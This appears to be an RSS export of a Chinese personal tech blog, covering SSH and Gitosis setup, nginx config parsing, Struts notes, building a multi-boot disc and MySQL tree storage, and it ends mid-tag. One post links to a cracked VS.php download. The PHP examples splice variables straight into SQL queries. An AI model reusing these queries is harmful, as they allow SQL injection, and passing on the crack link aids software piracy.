修改配置文件/etc/ssh/sshd_config：<br>

Port 22 # 修改成你想要的登陆端口,如2222 <br>


PermitRootLogin no # 禁止root用户登陆<br>

StrictModes yes # 检查密钥的用户和权限是否正确，默认打开的<br>

RSAAuthentication yes # 启用 RSA 认证<br>

PubkeyAuthentication yes # 启用公钥认证<br>

PasswordAuthentication no # 禁止密码认证，默认是打开的<br>

ServerKeyBits 1024 # 修改后变为此状态，将ServerKey强度改为1024比特<br>

PermitEmptyPasswords no # 修改后变为此状态，禁止空密码进行登录<br>

将id_rsa文件拷贝到Client端的~/.ssh/目录下，将id_rsa.pub拷贝到Server端的~/.ssh/目录下，改名为authorized_keys，重启SSH服务：<br>

sudo /etc/init.d/ssh restart<br>

安装Git软件：<br>

sudo apt-get install git-core<br>

安装Gitosis：<br>

mkdir ~/src<br>

cd ~/src<br>

git clone git://eagain.net/gitosis<br>

cd gitosis<br>

sudo python setup.py install<br>

增加git用户：<br>

sudo adduser –system –shell /bin/sh  –gecos ‘git version control’ –group –disabled-password –home /home/git git<br>

初始化git目录，USER指在当前服务器的用户：<br>

sudo -H -u git gitosis-init &lt; /home/USER/.ssh/authorized_keys
sudo chmod 755 /home/git/repositories/gitosis-admin.git/hooks/post-update<br>

在Client端执行：<br>

git clone git@YOUR_SERVER:gitosis-admin.git<br>

cd gitosis-admin<br>

在gitosis.conf配置文件中增加：<br>

[group myapp]<br>
members = vince@urbanpuddle<br>
writable = myapp<br>

然后提交：<br>

git commit -a -m “created a new repository”<br>

git push<br>

创建目录并提交文件<br>

mkdir myapp<br>

cd myapp<br>

编辑.gitignore加入要忽略的文件<br>

.DS_Store<br>

然后执行：<br>

cd myapp<br>
git init<br>
git remote add origin git@YOUR_SERVER:myapp.git<br>
git add .<br>

git commit -a -m “initial imp<wbr>ort”<br>
git push origin master:refs/heads/master]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>默认分类</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200992232828898/</guid>
    </item>
    <item>
      <title>
<![CDATA[nginx的五个模块(1) CONF]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010919111130213/</link>
      <description>
<![CDATA[Nginx 主要包括五个模块, conf, core, event, http, email<br>其中conf模块主要用来解析 nginx.conf 配置文件，并设置相关变量。<br>首先看conf文件的解析时机，从main函数开始解析。<br><b>从main到parse_conf</b><br>1. 在main函数中调用了 ngx_init_cycle函数，core/nginx.c<br>main(){ <br>cycle = ngx_init_cycle(&amp;init_cycle);<br><br>2. 在ngx_init_cycle函数中调用了ngx_conf_parse函数，core/ngx_cycle.c <br>ngx_init_cycle(ngx_cycle_t *old_cycle){<br>&nbsp;if (ngx_conf_parse(&amp;conf, &amp;cycle-&gt;conf_file) != NGX_CONF_OK) { <br><br>3. ngx_conf_parse 函数是 nginx.conf 文件解析的主要代码，core/ngx_conf_file.c <br>ngx_conf_parse(ngx_conf_t *cf, ngx_str_t *filename){<br>fd = ngx_open_file(filename-&gt;data, NGX_FILE_RDONLY, NGX_FILE_OPEN, 0);//打开 nginx.conf 文件<br>for ( ;; ) {//开始解析<br>&nbsp;&nbsp;&nbsp; rc = ngx_conf_read_token(cf);&nbsp;&nbsp; //读入一个<br>&nbsp;&nbsp;&nbsp; rc = ngx_conf_handler(cf, rc);&nbsp;&nbsp;&nbsp; //解析<br><br><b>配置文件读入与词法</b><br>static ngx_int_t<br>ngx_conf_read_token(ngx_conf_t *cf)<br>{<br>&nbsp;&nbsp;&nbsp; for ( ;; ) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (b-&gt;pos &gt;= b-&gt;last) { //读到缓存的文件已经解析完，就再文件中读入一段<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; n = ngx_read_file(&amp;cf-&gt;conf_file-&gt;file, b-&gt;start + len, size,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cf-&gt;conf_file-&gt;file.offset);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //分析字符<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (ch == LF) {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //换行符<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cf-&gt;conf_file-&gt;line++;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (sharp_comment) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sharp_comment = 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (sharp_comment) { //#开头的注释<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; continue;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (quoted) {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //双引号内<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; quoted = 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; continue;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (need_space) {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //需要空格<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (ch == ' ' || ch == '\t' || ch == CR || ch == LF) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; last_space = 1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; need_space = 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; continue;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (ch == ';') {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return NGX_OK;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (ch == '{') {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return NGX_CONF_BLOCK_START; //Block的开头<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br><br><b>配置文件解析与语义</b><br>ngx_conf_handler(ngx_conf_t *cf, ngx_int_t last){<br>&nbsp;&nbsp;&nbsp; for (i = 0; ngx_modules[i]; i++) {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //遍历每个模块<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (ngx_modules[i]-&gt;type != NGX_CONF_MODULE<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &amp;&amp; ngx_modules[i]-&gt;type != cf-&gt;module_type)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp; //如果模块不是要求的类型<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; continue;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmd = ngx_modules[i]-&gt;commands;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for ( /* void */ ; cmd-&gt;name.len; cmd++) {&nbsp;&nbsp; //遍历模块的每个命令<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (ngx_strcmp(name-&gt;data, cmd-&gt;name.data) != 0) { //如果命令与配置名相同 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; continue;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rv = cmd-&gt;set(cf, cmd, conf);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //执行命令相关的回调函数 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>}<br><b>示例</b><br>如 nginx.conf 中的 worker_process 选项：<br>worker_process 2;<br>首先调用ngx_conf_parse()函数，<br>调用rc = ngx_conf_read_token(cf);&nbsp; 读入一行配置worker_process 2;<br>调用rc = ngx_conf_handler(cf, rc);&nbsp;&nbsp; 去解析<br>在ngx_conf_handler函数中，遍历ngx_modules，ngx_modules定义在objs/ngx_modules.s文件中。其中包括ngx_core_module模块，在core/nginx.c中找到 ngx_core_module 的定义<br>ngx_module_t&nbsp; ngx_core_module = {<br>&nbsp;&nbsp;&nbsp; NGX_MODULE_V1,<br>&nbsp;&nbsp;&nbsp; &amp;ngx_core_module_ctx,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* module context */<br>&nbsp;&nbsp;&nbsp; ngx_core_commands,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* module directives */<br>&nbsp;&nbsp;&nbsp; NGX_CORE_MODULE,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* module type */<br>&nbsp;&nbsp;&nbsp; NULL,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* init master */<br>&nbsp;&nbsp;&nbsp; NULL,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* init module */<br>&nbsp;&nbsp;&nbsp; NULL,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* init process */<br>&nbsp;&nbsp;&nbsp; NULL,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* init thread */<br>&nbsp;&nbsp;&nbsp; NULL,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* exit thread */<br>&nbsp;&nbsp;&nbsp; NULL,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* exit process */<br>&nbsp;&nbsp;&nbsp; NULL,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* exit master */<br>&nbsp;&nbsp;&nbsp; NGX_MODULE_V1_PADDING<br>};<br>ngx_core_module 模块的commands是ngx_core_commands，同样定义在 core/nginx.c 中：<br>static ngx_command_t&nbsp; ngx_core_commands[] = {<br>...<br>&nbsp;&nbsp;&nbsp; { ngx_string("worker_processes"),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NGX_MAIN_CONF|NGX_DIRECT_CONF|NGX_CONF_TAKE1,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ngx_conf_set_num_slot,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0,&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; offsetof(ngx_core_conf_t, worker_processes),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NULL }, <br>...<br>}<br>可以看到worker_process的这个命令对应的处理函数指针set = ngx_conf_set_num_slot<br>ngx_conf_set_num_slot(ngx_conf_t *cf, ngx_command_t *cmd, void *conf)<br>{&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; char&nbsp; *p = conf; <br>&nbsp;&nbsp;&nbsp; np = (ngx_int_t *) (p + cmd-&gt;offset);<br>&nbsp;&nbsp;&nbsp; value = cf-&gt;args-&gt;elts;<br>&nbsp;&nbsp;&nbsp; *np = ngx_atoi(value[1].data, value[1].len);<br>&nbsp;&nbsp;&nbsp; return NGX_CONF_OK;<br>}<br>在ngx_conf_read_token中，2会被放入cf-&gt;args-&gt;elts的第一个元素中<br>通过 p+cmd-&gt;offset，获得在 ngx_core_conf 中 worker_process 成员的指针，从而设置 ngx_core_conf 中的worker_process 成员的值。]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Network</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010919111130213/</guid>
    </item>
    <item>
      <title>
<![CDATA[php开发环境VS.php]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200931010243463/</link>
      <description>
<![CDATA[VS2008的开发环境还是很好用的, VS.php是一个可以在VS2008中开发php的软件, <br>原生支持Zend MVC项目, 自带运行环境, 很好很强大, 最新版2.6, 可惜是30天试用版,<br>找到了2.5.1的破解版下载 http://cq.tuola.net/soft/view-2742.html<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200931010243463/</guid>
    </item>
    <item>
      <title>
<![CDATA[Struts都要学什么]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200921645623456/</link>
      <description>
<![CDATA[首先看Struts是什么? 一个MVC的框架<br>他的工作流程是怎样的? 一个jsp表单,提交到服务器的ActionServlet, 在ActionServlet里: 把表单封装成ActionForm,然后调用Action处理,最后转到Forward的页面. 简单说:就是 jsp-&gt;ActionForm-&gt;Action-&gt;jsp...<br>上面这两个问题搞清楚了,也就知道该学什么了.<br>第一: 7个ActionForm [Dyna][Validator][Action]Form 2*3(Validator和Action都没有的情况不存在 + LazyValidatorForm<br>第二: 4个Action [Lookup|Mapping](Dispatch)?Action <br>第三: 4类标签,html bean logic nested 知道这四类标签是做什么的就可以了,具体标签用时查文档. 初学struts可能不喜欢这些标签,因为习惯了html,用起来标签很不习惯, 但是这些标签会强制你遵循MVC的模式,使用了这些标签的struts应用才是更正宗的struts应用,否则很容易出轨,出现这种情况,用的Struts框架,走的老路线,最后发现Struts什么用都没有,最后干掉了.<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2EE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200921645623456/</guid>
    </item>
    <item>
      <title>
<![CDATA[Shutter——教育网终身免费打电话]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200871072525860/</link>
      <description>
<![CDATA[教育网针对大学生开发的免费电话软件，其权威性和真实性不容置疑！<br><br><span style="font-weight: bold;"  >本软件最重要的特点是你可以象挂QQ一样天天挂着它, 这样就可以按你的在线时间来给你记积分,而积分又可以换话费!挂50积分就能换8分钟的通话时间！300积分就能换1个小时的通话时间！!而且每天有一次 3分钟免费的机会。 最适合那些经常挂在网上的蜘蛛侠们了！以后挂QQ的同时顺便把它也挂上，这样一来,我们就能永远免费打电话了！</span><br><br>好了，现在教大家使用方法<br>第一步：注册一个号码（学校可以随便填)注册成功后登陆你的邮箱激活下就OK<br>第二步：下载并运行Shutter.exe进行安装，（中间有个选项是随WINDOWS一起启动，根据需要选）<br>第三步：安装完成后桌面有个Shutter，双击运行，输入你的注册邮箱和注册密码，OK，提示是否手机注册，别理他！开始打电话吧！<br>第四步：好的东西要和大家分享～推荐给你的朋友吧！顺便让他请你吃顿饭<br>3.带的网络电视不错，专门对教育网设计的，200多个频道，流畅清晰，而且连CCTV1--CCTV12都有。<br>4通话质量超好，很清晰！甚至比手机信号都好！<br>5用此软件还可以免费绑定手机，轻松实现手机和电脑呼叫转移！而且接此软件打来的电话也不收费！<br>6其它的自己摸索吧～～～<br><br>注册地址：<a target="_blank" rel="nofollow" href="http://shutter.cdream.com/register.php?linkid=5956179"  >http://shutter.cdream.com/register.php?linkid=5956179</a><br>下载地址：<a target="_blank" rel="nofollow" href="http://update.shutter.cdream.com/software/Shutter_4.6.4.5565.exe"  >http://update.shutter.cdream.com/software/Shutter_4.6.4.5565.exe</a>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>默认分类</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200871072525860/</guid>
    </item>
    <item>
      <title>
<![CDATA[自己动手做6合1安装光盘dqzhye]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009111371350488/</link>
      <description>
<![CDATA[工具：EasyBoot和UltraISO<br>系统：WindowsXP英文版 中文原版 番茄花园版 雨林木枫Ghost版 WinPE Ubuntu 9.10桌面版<br>开机界面<br><a href="http://img842.ph.126.net/VCFo0QLZmlbKjj8m86ws9A==/867505878223885930.jpg" target="_blank"><img title="自己动手做多系统安装光盘 - hankjin - 云水僧" alt="自己动手做多系统安装光盘 - hankjin - 云水僧" src="http://img842.ph.126.net/VCFo0QLZmlbKjj8m86ws9A==/867505878223885930.jpg"></a><br>主要制作步骤：<br>1. 以番茄花园为蓝本，用UltraISO将番茄花园的隐藏EZBOOT目录解出来，作为EasyBoot的项目<br>2. 集成Ubuntu，将Ubuntu9.10桌面版的所有文件解压缩到disk1的根目录下，然后将isolinux/isolinux.bin放入ezboot目录下，从原始的EasyBoot目录下将bcdw.bin拷到ezboot目录下，启动命令为 bcdw /ezboot/isolinux.bin<br>3. 集成英文Window，将英文Windows光盘的所有文件解压缩到disk1目录下，然后用UltraISO提取winxp.bif放入ezboot目录下，启动命令为run winxp.bif<br>4. 集成雨林木枫，将雨林木枫光盘的system/ylmf.gho拷贝到disk1目录下，用UltraISO将雨林木枫光盘的隐藏boot文件夹里的DOS.IMA和auto.ini拷贝到ezboot目录下，修心auto.ini，将src=system\ylmf.gho改为src=ylmf.gho启动命令为bcdw /ezboot/auto.ini<br>最后做ISO的时候选中“优化光盘文件”选项，做出来的ISO大小为2.5G，可以依照集成雨林木枫的方法将win7的ghost作进来，刚好是一个DVD的容量4.3个G。<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009111371350488/</guid>
    </item>
    <item>
      <title>
<![CDATA[使用Ubuntu制作UML文件系统]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720100635957490/</link>
      <description>
<![CDATA[首先创建映像文件，然后拷贝基本文件、内核模块，最后定制<br><br>#1. 创建映像文件，并格式文件系统<br>dd if=/dev/zero of=hjzfs bs=1024K count=400<br>mkfs.ext3 hjzfs<br>#2.1 加载基本文件<br>mount -o loop hjzfs /mnt<br>debootstrap --arch=i386 intrepid /mnt http://debian.ustc.edu.cn/ubuntu<br>#2.2. 拷贝modules<br>cp -r /usr/lib/uml/modules/* /mnt/lib/modules/<br>#3. 定制网络 文件系统 终端 用户<br>chroot /mnt<br>#3.1 网络 /etc/network/interface<br>auto lo<br>iface lo inet loopback<br>auto eth0<br>iface eth0 inet static<br>&nbsp;address 192.168.1.2<br>&nbsp;netmask 255.255.255.0<br>&nbsp;gateway 192.168.1.1<br>#3.2 文件 /etc/fstab<br>/dev/ubda&nbsp; /&nbsp; ext3 defaults 0 1<br>proc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /proc&nbsp; proc defaults 0 0<br>#3.3 终端 /etc/default/console-setup, 注释掉这下面一句<br>#ACTIVE_CONSOLE=tty[1-6]<br>cd /etc/event.d/<br>rm tty[2-6]<br>mv tty1 tty0<br>#/etc/event.d/tty0 的最后一行，将tty1改为tty0<br>exec /sbin/getty 38400 tty0<br>#3.4 创建用户，并加入sudoers<br>adduser hankjin<br>#修改/etc/sudoers<br>root&nbsp;&nbsp;&nbsp; ALL=(ALL) ALL<br>hankjin ALL=(ALL) ALL<br>#退出<br>exit<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720100635957490/</guid>
    </item>
    <item>
      <title>
<![CDATA[计算机博弈-1]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720084151830326/</link>
      <description>
<![CDATA[<P>一个step by step的计算机博弈网站， 使用VC做的，可以顺便学VC和图形学。 </P>  <P><A rel="nofollow" href="http://www.elephantbase.net/computer.htm"  >http://www.elephantbase.net/computer.htm</A></P>  <P>开始，首先下载象棋小巫师0.1的源代码，是7z压缩的，</P>  <P>1。用VC新建一个Win32项目，把XQWLIGHT.RC, RESOURCE.H,&nbsp; XQWL01.cpp这三个文件和RES文件夹拷贝到项目目录下</P>  <P>2。分别将三个文件加入项目下，然后编译，报错（），打开项目-〉设置-〉LINK，加入winmm.lib，重新编译OK</P>  <P>3。运行，一个中国象棋界面OK了，只有先后走的规则，将帅可以飞出去砍人，所有子都是超人，横冲直撞。</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>C/C++</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720084151830326/</guid>
    </item>
    <item>
      <title>
<![CDATA[我沉默，因为我思考]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200991811234527/</link>
      <description>
<![CDATA[我沉默，因为我在思考；我思考，所以我沉默<br>第一次喝彩虹汽水的小丑突然变得心思敏锐、口齿便捷，过了几天，又回复先前那副浑浑噩噩的德行，甚至变得更加迷糊了。<br>小丑吐出亮晶晶的饮料。不再引用诳骗水的小丑，思路变得更加清晰<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200991811234527/</guid>
    </item>
    <item>
      <title>
<![CDATA[代码大全-&gt;功能需求]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009613131897/</link>
      <description>
<![CDATA[功能需求需要哪些信息呢？<br>1. 定义系统的全部输入 来源、精度、取值范围、出现频率。<br>2. 定义系统的全部输出<br>3. 定义所有的输出格式 Web页面、报表、PDF等<br>4. 定义所有硬件及软件的外部接口<br>5. 定义所有外部通信接口<br>6. 列出用户想要做的全部事情<br>7. 定义每个任务所用的数据<br><br>看看现在的项目，瀑布汗啊。没有一条达到的。<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009613131897/</guid>
    </item>
    <item>
      <title>
<![CDATA[任务计划]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372007878509626/</link>
      <description>
<![CDATA[<P>有很多批量程序要求每天固定的时间跑，有些CICS中的交易也是，在Windows下有任务计划，Linux下有cron，大型机上呢？</P>
<P>方案一：如此写程序</P>
<P>///...business logic</P>
<P>//exec cics start transid('self') at hourse(xx) minutes(xx) seconds(xx) end-exec.</P>
<P>类似递归调用</P>
<P>方案二：使用SA：大型机上的一个Facility，我们的系统上没有。</P>
<P>方案三：使用软件，比如OPC,CONTROL-M等，这个在CM上看到的。</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>MVS</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372007878509626/</guid>
    </item>
    <item>
      <title>
<![CDATA[在数据库中存储层次数据]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372008451172859/</link>
      <description>
<![CDATA[<P>存储树形结构是一个很常见的问题，他有好几种解决方案。主要有两种方法：邻接列表模型和改进前序遍历树算法</P>  <P>1.</P>  <P>1.1显示：</P><PRE lang="php" >&lt;?php  // $parent 是我们要查看的子节点的父节点  // $level 会随着我们深入树的结构而不断增加，  //        用来显示一个清晰的缩进格式  function display_children($parent, $level) {      // 获取$parent的全部子节点      $result = mysql_query('SELECT title FROM tree '.                             'WHERE parent="'.$parent.'";');         // 显示每个节点      while ($row = mysql_fetch_array($result)) {          // 缩进并显示他的子节点的标题          echo str_repeat('  ',$level).$row['title']."\n";             // 再次调用这个函数来显着这个子节点的子节点          display_children($row['title'], $level+1);      }  }  ?&gt;</PRE><PRE lang="php" >1.2获取路径</PRE><PRE lang="php" ><PRE lang="php" >&lt;?php  // $node 是我们要查找路径的那个节点的名字  function get_path($node) {      // 查找这个节点的父节点      $result = mysql_query('SELECT parent FROM tree '.                             'WHERE title="'.$node.'";');      $row = mysql_fetch_array($result);         // 在这个<A title="An array is single variable with compartments each of which can hold a value" rel="nofollow" href="http://www.sitepoint.com/print/%5C%22/glossary.php?q=%23#term_72%5C%22"  ><FONT color="#3366cc" >array</FONT></A> <SPAN 